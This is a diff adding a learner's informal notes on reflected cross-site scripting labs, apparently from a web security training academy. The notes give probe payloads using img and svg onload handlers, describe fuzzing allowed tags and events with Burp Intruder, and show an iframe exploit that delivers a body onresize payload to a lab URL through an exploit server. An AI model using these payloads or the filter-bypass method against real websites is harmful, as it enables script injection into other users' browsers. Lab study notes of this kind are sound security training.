@@ -1,0 +1,28 @@
+XSS --> cross site scripting
+
+lab01
+
+><img src=x onload=alert(1)>    or  <somename   ---> this is used to conform there is a vernalability in the code.(here when the secound one is used you have to check in the inspection ctrl+U to see the saved search when the search item is like '<somename' then it is conformed that it is vernalable)
+
+then to reflect xss into html we use 
+
+<svg src=x onload=alert(14)>   or <svg/ onload=alert(14)// 
+
+you can use any of these.
+
+----------
+
+next is the reflected XSS into HTML context with most tags and attributes blocked:
+
+try with some tags when not happing, go to the cross site scripting cheat sheet and copy all tags .
+then open brup suite and intersept the connection and sent it to intruder , paste the tags there select only the place where tag has to be replaced and start the process of verifining what tags are allowed.
+
+same goes for the events also.
+
+https://0a2b00c7041c87068096212d000f0024.web-security-academy.net/?search=%3Cbody%2F+onresize%3Dalert(45)%2F%2F  ---> this is the source file 
+
+<iframe src= "https://0a2b00c7041c87068096212d000f0024.web-security-academy.net/?search=%3Cbody%2F+onresize%3Dalert(45)%2F%2F" onload=this.style.width="500px"><iframe>     
+
+this above code has to be saved and then used on the victium to exploit him here it is saved in roxci.html file.
+
+this above code has to be submitted in the exploit server provided.
